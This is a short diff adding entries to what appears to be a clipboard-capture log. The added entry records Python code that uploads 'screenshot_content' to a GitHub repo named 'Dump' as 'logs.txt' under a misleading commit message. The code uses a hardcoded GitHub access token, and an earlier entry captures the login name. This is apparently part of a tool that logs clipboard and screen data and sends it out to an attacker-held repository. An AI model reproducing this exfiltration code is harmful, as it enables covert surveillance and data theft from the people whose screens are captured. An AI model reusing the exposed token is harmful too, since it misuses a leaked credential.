@@ -9,3 +9,19 @@ Clipboard 2024-11-06 00:49:18 :
 
 2024-11-06 01:40:46
  Clipboard 2024-11-06 01:40:46 : os.getlogin()
+
+2024-11-06 01:59:58
+
+Clipboard 2024-11-06 01:59:58 : GITHUB_TOKEN = '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'        #api valid till feb 2025
+
+REPO_OWNER = 'Comm1tS1thL0rd'
+
+REPO_NAME = 'Dump'
+
+FILE_PATH = 'logs.txt'
+
+COMMIT_MESSAGE = 'Update file.txt with new data'
+
+NEW_DATA = ''
+
+create_github_file(GITHUB_TOKEN, REPO_OWNER, REPO_NAME, FILE_PATH, screenshot_content, COMMIT_MESSAGE)
